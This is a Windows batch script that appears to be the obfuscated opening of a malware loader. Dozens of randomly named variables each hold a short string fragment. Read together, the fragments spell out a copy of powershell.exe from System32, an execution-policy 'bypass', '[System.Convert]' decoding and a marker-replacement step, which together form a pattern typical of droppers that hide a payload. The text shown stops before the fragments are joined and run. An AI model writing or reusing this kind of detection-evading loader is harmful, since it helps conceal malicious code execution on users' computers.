@echo off
set "xGetqtbnGQ=.e"
set "ORWCHfwAIn=\W"
set "swZNREMatS=rs"
set "FLScUVPpas=rS"
set "kHWdDTzKHF=do"
set "VCIweyYQHL=32"
set "pXMdIrwBad=ow"
set "mizKAgUSZO=we"
set "XBeMVqtjAd=\v"
set "tFyPJSudBA=ws"
set "LtOdtcmnJI=0\"
set "HioQUYvBeV=he"
set "ElbadmFGjp=we"
set "tdhdzyKjMl=xe"
set "SiWTvdTJPB=1."
set "cmmuZHxXld=Po"
set "vihMerwgAy=st"
set "PaayugeBVE=po"
set "dhhTqaINQq= /"
set "mYbmuycgBU=y "
set "VkTdOCZyit=:\"
set "ZrOlWArOZg=ll"
set "nDmMFXuEjV=s\"
set "vCzEtlfOoC=ll"
set "rRZWvXCFEy=Sy"
set "BoeKkblQqX=in"
set "KqFjFyMUIB=em"
set "UURtGNjBBE=co"
set "hENZcjxlOy= C"
set "cYHozqgRrw=nd"
set "egASnRiyyp=he"
set "BqFPFmcugU=py"
set "pjkjQgRGmS=Wi"
set "leOzyPLDaF= %~dp0"
set "BjsVaZnHAN=cd"
set "lEBtGWcmzs=ode]"
set "RlFQVBqpMF= '')"
set "SVPzXMUxzZ=bypa"
set "JefjTvTtTJ=dUjn"
set "GBdPekURtq=Conv"
set "XlxpDpzVEB=orF'"
set "voLYYmrhpO=rity"
set "auElsbTsIl=[Sys"
